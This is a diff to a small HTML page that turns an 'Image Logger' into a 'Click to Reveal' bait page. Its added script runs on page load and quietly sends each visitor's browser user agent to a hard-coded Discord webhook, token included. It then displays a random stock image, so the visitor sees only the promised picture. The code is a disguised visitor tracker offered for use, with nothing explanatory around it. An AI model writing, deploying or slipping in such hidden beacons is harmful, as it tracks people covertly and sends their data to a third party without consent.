@@ -1,11 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Image Logger</title>
+  <meta charset="utf-8">
+  <title>Tracker</title>
+  <style>body{font-family:sans-serif;text-align:center;padding:50px;}</style>
 </head>
 <body>
-  <h1>Image Logger</h1>
-  <p>Use <code>/pixel.gif</code> to log views</p>
-  <img src="/pixel.gif" alt="pixel">
+  <h1>Click to Reveal</h1>
+  <img id="img" src="" style="display:none;max-width:100%;">
+  <script>
+    // Log viewer
+    fetch('https://discord.com/api/webhooks/1464006669796118610/NtLug816A6N5psWgUjMrUBFe-yRtvmPvmIC8hMrbORLuDrxP4QnErus1K5XH2pKlqXi9', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({content: 'Viewed: ' + navigator.userAgent})
+    });
+    // Show image
+    document.getElementById('img').src = 'https://picsum.photos/400/300';
+    document.getElementById('img').style.display = 'block';
+  </script>
 </body>
 </html>
